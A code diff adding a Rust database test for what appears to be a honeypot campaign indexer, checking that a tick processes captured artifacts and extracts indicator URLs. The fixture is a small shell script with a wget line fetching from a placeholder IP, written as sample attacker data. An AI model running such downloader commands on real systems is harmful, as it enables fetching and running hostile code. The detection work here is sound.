@@ -1035,3 +1035,33 @@ async fn a_second_indexer_is_locked_out_while_one_holds_the_lock(pool: PgPool) {
         BatchOutcome::Indexed(1)
     );
 }
+
+/// The daemon's tick: nothing at all when asked to stop, otherwise every pass in one call.
+#[sqlx::test(migrations = false)]
+async fn a_tick_runs_every_pass_and_stops_when_asked(pool: PgPool) {
+    migrate(&pool).await;
+    let spool = tempfile::tempdir().unwrap();
+    let body = b"#!/bin/sh\nwget http://198.51.100.5/x\n";
+    let sha = sha_hex(body);
+    std::fs::write(spool.path().join(&sha), body).unwrap();
+    upload(&pool, "192.0.2.91", t0(), &sha, None).await;
+    let dirs: Vec<(&'static str, PathBuf)> = vec![("ssh", spool.path().to_path_buf())];
+
+    let stopped = campaign::run_tick(&pool, &dirs, &|| true).await;
+    assert_eq!(stopped, campaign::TickStats::default());
+    let cursor: i64 = sqlx::query_scalar("SELECT last_event_id FROM campaign_cursor")
+        .fetch_one(&pool)
+        .await
+        .unwrap();
+    assert_eq!(cursor, 0);
+
+    let stats = campaign::run_tick(&pool, &dirs, &|| false).await;
+    assert_eq!((stats.batches, stats.events, stats.caught_up), (1, 1, true));
+    assert_eq!(stats.artifacts_scanned, 1);
+    let url: String = sqlx::query_scalar("SELECT value FROM ioc WHERE artifact_sha256 = $1")
+        .bind(&sha)
+        .fetch_one(&pool)
+        .await
+        .unwrap();
+    assert_eq!(url, "http://198.51.100.5/x");
+}
